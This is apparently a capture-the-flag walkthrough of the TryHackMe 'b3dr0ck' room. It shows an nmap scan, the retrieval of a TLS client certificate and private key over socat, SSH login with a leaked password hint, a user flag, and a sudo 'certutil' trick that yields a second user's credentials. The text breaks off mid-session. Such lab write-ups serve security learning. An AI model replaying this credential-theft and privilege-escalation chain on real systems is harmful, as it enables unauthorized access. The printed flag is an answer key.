---
Server trouble in Bedrock.
---

![](https://f11snipe.cloud/assets/img/b3dr0ck-banner.png)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/e53a67e9382eed0edd9916a7da119031.png)

### Yabba-Dabba-Doo 

Fred Flintstone   &   Barney Rubble!

Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble. Here's what we know...

    He was able to establish nginx on port 80,  redirecting to a custom TLS webserver on port 4040
    There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate)
    There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service
    Can you find all the Easter eggs?

```

https://10.10.179.238:4040/

Welcome to ABC!

Abbadabba Broadcasting Compandy

We're in the process of building a website! Can you believe this technology exists in bedrock?!?

Barney is helping to setup the server, and he said this info was important...

Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
Bamm Bamm tried to setup a sql database, but I don't see it running.
Looks like it started something else, but I'm not sure how to turn it off...

He said it was from the toilet and OVER 9000!

Need to try and secure connections with certificates...




rustscan not work for me so nmap but need to waittttttt 😴 

┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -sC -sV -p- 10.10.179.238        
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-24 14:19 EDT
Nmap scan report for 10.10.179.238
Host is up (0.20s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)
|   256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)
|_  256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.10.179.238:4040/
|_http-server-header: nginx/1.18.0 (Ubuntu)
4040/tcp  open  ssl/yo-main?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Sat, 24 Sep 2022 18:44:10 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|     Need to try and secure
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Sat, 24 Sep 2022 18:44:11 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|_    Need to try and secure
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2022-09-24T18:06:15
|_Not valid after:  2023-09-24T18:06:15
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
9009/tcp  open  pichat?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
54321/tcp open  ssl/unknown
| fingerprint-strings: 
|   NotesRPC: 
|_    Error: 'undefined' is not authorized for access.
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2022-09-24T18:06:15
|_Not valid after:  2023-09-24T18:06:15
|_ssl-date: TLS randomness does not represent time
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4040-TCP:V=7.92%T=SSL%I=7%D=9/24%Time=632F4FFB%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nDate:\x20Sat,\x2024\x20Sep\x202022\x2018:44:10\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<head>\n\x20\x20
SF:\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x
SF:20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2035em;\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x20sans-serif;
SF:\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x20\x20</head>\
SF:n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20ABC!</h1>\n\x20
SF:\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n\n\x20\x20\x2
SF:0\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x20a\x20website
SF:!\x20Can\x20you\x20believe\x20this\x20technology\x20exists\x20in\x20bed
SF:rock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helping\x20to\x20se
SF:tup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info\x20was\x20im
SF:portant\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\x20only\x20fi
SF:gured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll\x20is\x20a\x
SF:20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a\x20sql\x20da
SF:tabase,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLooks\x20like\x
SF:20it\x20started\x20something\x20else,\x20but\x20I'm\x20not\x20sure\x20h
SF:ow\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x20was\x20from\
SF:x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20try\x20and\x2
SF:0secure\x20")%r(HTTPOptions,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type
SF::\x20text/html\r\nDate:\x20Sat,\x2024\x20Sep\x202022\x2018:44:11\x20GMT
SF:\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<he
SF:ad>\n\x20\x20\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\
SF:x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2
SF:035em;\n\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x
SF:20sans-serif;\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x2
SF:0\x20</head>\n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20AB
SF:C!</h1>\n\x20\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n
SF:\n\x20\x20\x20\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x2
SF:0a\x20website!\x20Can\x20you\x20believe\x20this\x20technology\x20exists
SF:\x20in\x20bedrock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helpin
SF:g\x20to\x20setup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info
SF:\x20was\x20important\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\
SF:x20only\x20figured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll
SF:\x20is\x20a\x20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a
SF:\x20sql\x20database,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLo
SF:oks\x20like\x20it\x20started\x20something\x20else,\x20but\x20I'm\x20not
SF:\x20sure\x20how\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x2
SF:0was\x20from\x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20
SF:try\x20and\x20secure\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9009-TCP:V=7.92%I=7%D=9/24%Time=632F4FE5%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29E,"\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\
SF:n\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x
SF:20\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x2
SF:0___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x2
SF:0\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x2
SF:0\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20
SF:/\x20/\\\x20\\\x20\|\x20\x20_\x20<\|\x20\|\x20\x20\x20\x20\x20\n\x20\x2
SF:0\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|
SF:\x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x2
SF:0\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\__
SF:_\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
SF:n\nWhat\x20are\x20you\x20looking\x20for\?\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port54321-TCP:V=7.92%T=SSL%I=7%D=9/24%Time=632F4FFD%P=x86_64-pc-linux-g
SF:nu%r(NotesRPC,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20f
SF:or\x20access\.\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1620.07 seconds
zsh: segmentation fault  nmap -sC -sV -p- 10.10.179.238

after 27 minutes


https://snoopysecurity.github.io/network-security/2018/03/21/introduction_to_socat.html

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/b3dr0ck]
└─$ socat TCP:10.10.179.238:9009 -                                           


 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               


What are you looking for? l
Sorry, unrecognized request: 'l'

You use this service to recover your client certificate and private key

What are you looking for? certificate
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjA5MjQxODA2MzZaFw0yMzA5MjQxODA2MzZaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC64b0B
Xco0xGNT9yPCjdEcZ8HpEU1Owk06sdzsPJkpVvOSI+DllMRqrFuqN6fzzS9oBOry
xG+Sodt5A0rPgBSIeWedVQdtMHC7vJtHGdl3q7Hm7l3PvzHvAmQtMlbcS1XKvYO7
vIviTz80ZPnd55QqdWyUIeQlv6ZpBe0Trv9ozoJTuFTIvnsumJaZi5dARRNzCoN1
XR/z06vH6xZEE8/YfTUCBVgA4d4LVBIeyVYT6mfccT9uiwGhyVs+bnOiVX/UFr9N
GDW5wHnpwWZ+r3cI9vRFSzwZIygBWR8RbA1/EASME0sivyTuzgK1uqQkhEyl1p0k
K9F1Sf+zUCJE1NNTAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAJui6KFeBEzv2ILc
UejaSmMZHJGaUfVace1Wy7Oo99PL+T15dIUUdlp6AUBG5jbVGJKz8j4lQuifETU2
O0U++P0CrZtLMvNzfEHaCtmTC5u6Sx+6OWo5xcdHTJDLijtZwUZu43jgZcBLZGh0
AVfpeD7uZm/J8Z+QzF0kldDp5lp86z7leCDjnUEWAX599xJfB2GpmX7HcVfKsfA2
RU0DblwNYtqKbYTWXn0mWh9QPOAVFRTYTHblmte2n3JH/t/iOeVEJ2w48JCj7KaS
+G95Tlq6KXBGMZ9PUAsNaGXLlD7I6xNKjN2VUZo/QH4GMxJb0MesX4V3ETZuDXl1
mOXoO/4=
-----END CERTIFICATE-----


What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAuuG9AV3KNMRjU/cjwo3RHGfB6RFNTsJNOrHc7DyZKVbzkiPg
5ZTEaqxbqjen880vaATq8sRvkqHbeQNKz4AUiHlnnVUHbTBwu7ybRxnZd6ux5u5d
z78x7wJkLTJW3EtVyr2Du7yL4k8/NGT53eeUKnVslCHkJb+maQXtE67/aM6CU7hU
yL57LpiWmYuXQEUTcwqDdV0f89Orx+sWRBPP2H01AgVYAOHeC1QSHslWE+pn3HE/
bosBoclbPm5zolV/1Ba/TRg1ucB56cFmfq93CPb0RUs8GSMoAVkfEWwNfxAEjBNL
Ir8k7s4CtbqkJIRMpdadJCvRdUn/s1AiRNTTUwIDAQABAoIBAB54vFbCsjvUYdXJ
EF2ivhwBlw6nsZFMAUe2xK0IXHjvIpwLmZoVnck+/VtN4+bO6BHv61dWTFL+bUjY
DpSy76YpFYoD2Ugmg9s4r6DySBFJP6LF7yn2pO+x1h/Ae4VEC2MZb6dm4PAvt8CV
TmCuZ+xcZS3qMMcu7rVlL/jrqd2utxrwQrU3LqKTSesh9Jjf/rLB+4NoHGJ+oQmX
ngmNnUBPss6fKakTLGo/UmJOR13UFTPhRdDyIcPtO6a902qqMcR+oGxuW4wwSJ7B
aCuNmOe7hXe9SavCO9RCf9jOQk7wmg8cLCVayE2WPicaTaJb30mJS+q/1Zu9IPh/
48vAFEECgYEA4HpoIAOtMMlftlZ0coTeWQz+qwIg3OKxZXmB1bo3BpR6bZfDqJkG
967z0oF64HMaVdsH/kFrPpHGCAyM2PMkpZg6+r6pAoHkj47FhzNXouhkOcLSQ1aO
8uYVoi8/yVUU2nkXvbsKXdwO5dgBxVMxeFLpUBPsKjNBIkYmzLZ4aIMCgYEA1R/P
Cm1XV91j4+S0Wl/4AtNFn03riIbIyLh5pbP8iIlqDY1graCQdHwyVSLrn1ujrZSW
x4T/f9bH3/bdYlOjWsSwYmenZxhWExrHk6oSrdARnytAo9U4LRfamnZp52AZ5pJI
R3aVvPRniKNy5ka4/Ry5Iv6fYBG4cx2zabAw0PECgYBg+0FlI3F9tGKPikaA+3p8
iqq0AxVjmOT/bEF1rx/6zcce9gRoIMTr2UAp4BrQQapNEXYgmO7Wd3BRJersCA/7
IwvILPsjxC6U/x/Dy6C/FxvGAK+KvCjCNDmAel1ahFGgGdTx+Y7/AgXFs08Ai3LC
A0Adgp3zlXU8c4ZrxyG6NQKBgQC+z//aYhL1Q+4PN9CRqaKvRODsxCLA1YwmyaOA
TCkpRX6CK7YHPd6XrCqUNvOmdbGR05s7f0QR/QZu6uNDCYcT2U3ijNNAZnWKHUva
VUbr/4IHc/4nsNre5KB/8szWryABY6767J0b0+ZuW4ify2oMlA7d2gJvTO5LgqgD
VBAgwQKBgQDTBI//JanYwQC3cYofdGfhtrKljekwgTouw6cv3vusYh7oOrjellsh
JQzwMgcHWs9SQKYYFAfKLqYxUGCK6CkxPWE8iMdOoeYm5tYeP8XaWYASzBr78ISm
fIo59ikj8EPZhIZ3mzJEjDS/KT93gTOjN8jHdwM1L0LEMk432eqakQ==
-----END RSA PRIVATE KEY-----


┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/b3dr0ck]
└─$ nano certificate
                                                                                                           
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/b3dr0ck]
└─$ nano key  


What are you looking for? --help
Looks like the secure login service is running on port: 54321

Try connecting using:
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0


┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/b3dr0ck]
└─$ socat stdio ssl:10.10.179.238:54321,cert=certificate,key=key,verify=0


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'Barney Rubble' is authorized.
b3dr0ck> pass
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/b3dr0ck]
└─$ ssh barney@10.10.179.238       
The authenticity of host '10.10.179.238 (10.10.179.238)' can't be established.
ED25519 key fingerprint is SHA256:CFTFQcdE19Y7z0z2H7f+gsTTUaLOiPE1gtFt0egy/V8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.179.238' (ED25519) to the list of known hosts.
barney@10.10.179.238's password:  d1ad7c0a3805955a35eb260dab4180dd
barney@b3dr0ck:~$ ls
barney.txt
barney@b3dr0ck:~$ cat barney.txt
THM{f05780f08f0eb1de65023069d0e4c90c}

The information we gathered above tells us that we will have to utilize certutil to privesc as fred, since we do have sudo privilege in certutil. Typing certutil -h will show us how to list current certs. 

barney@b3dr0ck:~$ cd /home/fred
barney@b3dr0ck:/home/fred$ ls
fred.txt
barney@b3dr0ck:/home/fred$ cat fred.txt
cat: fred.txt: Permission denied


barney@b3dr0ck:/home/fred$ ls -la
total 36
drwxr-xr-x 4 fred fred 4096 Apr 30 21:41 .
drwxr-xr-x 4 root root 4096 Apr 10 00:18 ..
lrwxrwxrwx 1 fred fred    9 Apr 28 06:42 .bash_history -> /dev/null
-rw-r--r-- 1 fred fred  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 fred fred 3771 Feb 25  2020 .bashrc
drwx------ 2 fred fred 4096 Apr 30 21:41 .cache
-rw------- 1 fred fred   38 Apr 29 06:30 fred.txt
-rw-rw-r-- 1 fred fred    0 Apr 30 21:41 .hushlogin
-rw-r--r-- 1 fred fred  807 Feb 25  2020 .profile
-rw-rw-r-- 1 fred fred   75 Apr 10 00:35 .selected_editor
drwx------ 2 fred fred 4096 Apr 29 06:31 .ssh
lrwxrwxrwx 1 root root    9 Apr 29 06:31 .viminfo -> /dev/null
barney@b3dr0ck:/home/fred$ certutil -h

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]


The below  shows files with fred as the filename. That tells me we can use these files like we did with the user barney. We cannot use cat or any text editors to open any of the files, so we have to do more reading on how to utilize certutil to read the contents of any of the files.

barney@b3dr0ck:/home/fred$ certutil ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30 21:54 .
drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
-rw-r----- 1 root root  972 Sep 24 18:06 barney.certificate.pem
-rw-r----- 1 root root 1678 Sep 24 18:06 barney.clientKey.pem
-rw-r----- 1 root root  894 Sep 24 18:06 barney.csr.pem
-rw-r----- 1 root root 1678 Sep 24 18:06 barney.serviceKey.pem
-rw-r----- 1 root root  976 Sep 24 18:06 fred.certificate.pem
-rw-r----- 1 root root 1678 Sep 24 18:06 fred.clientKey.pem
-rw-r----- 1 root root  898 Sep 24 18:06 fred.csr.pem
-rw-r----- 1 root root 1678 Sep 24 18:06 fred.serviceKey.pem



barney@b3dr0ck:/home/fred$ sudo cat fred.csr.pem
Sorry, user barney is not allowed to execute '/usr/bin/cat fred.csr.pem' as root on b3dr0ck.
barney@b3dr0ck:/home/fred$ sudo certutil -a fred.csr.pem
Generating credentials for user: a (fredcsrpem)
Generated: clientKey for a: /usr/share/abc/certs/a.clientKey.pem
Generated: certificate for a: /usr/share/abc/certs/a.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAsfPgXayDykAtjUzKLf1tKtAHZZ0eVlVgGpduVZGONc4SC1Wu
CRojI+FD5hcOuCzXQm+AG+EdBRoPenqD5hTD7qBXDg3Nc+WVviZnNU2ORbsSo2G6
uoP9Gnhl14AVk8xUrtTSk86lP546kMUn5bS+WF08zyrJrVqMeJOlR6xxmZ1v2NKb
E8vg7lDl2BcsXy4uL5Xdlu2prUjiWNg8XNKa7KekLRpqzWYPAfyx3w0086GVSmCE
FAjpslD40soWyB3xKcTaoVefXksx+5gJHR3I1d4lqhVIuLSPNIufQlB4AJg+L/Vz
NwTAqPmMBwEdbR/+PN9ZD3yedpYiRJvrN7HQZQIDAQABAoIBAAkCZduYPlvg/+1l
c978M6i1O4qjd8O7MtBl1koywlZrBnLYdaU0U48feoaNqEseyg8tAflnXkbB2QLE
bSUa7AiKyZ2GiV5Sw1ALNbJ3KLrTC9CFxCRpRkkuy0krzOvcrnTjhX3COo+L/T8T
HD/+9JwYrFl4uxkxumboYrfMPTwfrMJ36hTsFoU9vBeCnFMMok33oGQC4RpJAt6y
yKad/Yf9PB7Ky4e5h9Zjn/5wZeMest3jwXvHc8rHDnemHlen6yOSC2/0WIhjOoIY
M4Fonhs118Z87AlpP5+8tlOla4iZx6DYADXplHMHOUOoT3qNqCy23e+NYirNsf6q
8Xr2WwECgYEA4c47V0aIerLzm+LyoepW8Dc5UWu+nxJrERvVxCzt0w+ikWSZU/+M
VX5ezpW3YxWcRA2qFEO6YIGSr/vdjOihxUMKzKYP7dsCdDiAJgKHQa51H08lOM58
MjNAbR6vi7shQL0y5G71ty7XujbbV8txMDOk1vO1V0tKFZlPreTuJiECgYEAyb+L
Vy4oISchUFexSL8k6OYohHssLYseOs8Dcg+X7Eg0vyUsgJ7bw7RrjaO7BZknRDrQ
Gb6krIJ2R7R3ugj5aOShIgq6Ttot0n3oY/uP7heFL/5MTIhxYMloWwDtrZ61d8SS
o+25/AFVLqO9N3IRWkZowENVksQ6jQbiriGNWcUCgYBzeK0r4mvkoyKksxf06Qtw
aC0tj/W5DwglhaB5Y6hy6GnwBAvMwsAW8Dq3ViSjzOdOfdZd6oyi0WAcEqanakdf
wvsA0GMQ9ZB5snMF/QEB+571VdnpBN7KJR9rLegDgrxsiNQ/sOaCuLelCGx+pxDI
34AKVDKF44CNLwtqF8oZQQKBgBa37yT+GZ7CHUpC1b/vZmSjpmRkynDGfbz5mtW5
U85TwzzTHtPND8pWAtaMXX8f5AAW72A2y6xxdIhWljTo1c0uEccXlitS/l35t7Wq
mmahV2o0JLtpkfroM0wsKpemi6DVDf5PwuXR8Jmz7pbTzYhw7VLZQkWouz8uS1B4
jsZRAoGAXOx2cv82GK1WxkQOWd0/v8jf+mvTBQw+TkcEp6DHXETenmuTlsRAzfIv
SZECeb1TW5u7dk+Y/0KATVQ8+K6b4As9IYHtaxRDlBnyZFwM6Q83XWVqaswaAZv9
OoH2as2ZEOgkm/Y4worNWQ2G7z/W5rWq7fjdF3YRRNwaBRYmtRw=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIICnjCCAYYCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjA5MjQxODQ0MzdaFw0yMjA5MjUxODQ0MzdaMBUxEzARBgNVBAMMCmZy
ZWRjc3JwZW0wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCx8+BdrIPK
QC2NTMot/W0q0AdlnR5WVWAal25VkY41zhILVa4JGiMj4UPmFw64LNdCb4Ab4R0F
Gg96eoPmFMPuoFcODc1z5ZW+Jmc1TY5FuxKjYbq6g/0aeGXXgBWTzFSu1NKTzqU/
njqQxSfltL5YXTzPKsmtWox4k6VHrHGZnW/Y0psTy+DuUOXYFyxfLi4vld2W7amt
SOJY2Dxc0prsp6QtGmrNZg8B/LHfDTTzoZVKYIQUCOmyUPjSyhbIHfEpxNqhV59e
SzH7mAkdHcjV3iWqFUi4tI80i59CUHgAmD4v9XM3BMCo+YwHAR1tH/4831kPfJ52
liJEm+s3sdBlAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAFErosPjO1fvUSFp2ecR
E1PV/je8Z5qkdRIeAxP7+YvDhTQayt02Zqw9R+l1NkEadSWR1dfrMnq/UnMZvWe2
q+IOHq8tf/xyq3N7NQucrIMDDI8vKRIOeMLcZyIkmIBLfstMA2rs0AwGuX9RWD9t
vHopVfYvXPWdJ4POg1b+alwYoeeSEnsaqlWbAK47qaSFCgE7Rqmn2gYSSiJWKd+j
5IOsqT6/Q98FJqGmvLfeKAfKdnHTYOslXhFIU1zQ2HHI00C6Z59krZqX1H1r9h+U
zzbKYoC/2ZjC6ncStOM6aLJGS41Hmie6ur27iNyGgvrEKHTfDQk+a1JV7OwImIiA
wdw=
-----END CERTIFICATE-----

so the same method use socat

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/b3dr0ck]
└─$ nano fredcertificate                       
                                                                                                         
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/b3dr0ck]
└─$ nano fredkey        
                                                                                                         
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/b3dr0ck]
└─$ socat stdio ssl:10.10.179.238:54321,cert=fredcertificate,key=fredkey,verify=0


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
